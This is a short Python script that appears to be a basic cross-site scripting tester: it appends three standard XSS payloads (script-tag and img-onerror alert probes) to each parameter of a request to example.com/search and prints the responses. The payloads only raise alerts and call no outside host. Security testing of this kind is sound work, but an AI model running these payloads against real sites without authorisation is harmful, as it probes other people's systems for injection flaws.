from utils import send_request, print_response

def test_xss(url, params):
    print("\n[+] Testing for XSS...")
    
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "\"'><script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>"
    ]
    
    for payload in xss_payloads:
        vulnerable_params = {k: v + payload for k, v in params.items()}
        response = send_request(url, data=vulnerable_params)
        print(f"\nTesting payload: {payload}")
        print_response(response)

if __name__ == "__main__":
    target_url = "http://example.com/search"
    params = {"query": "test"}
    test_xss(target_url, params)
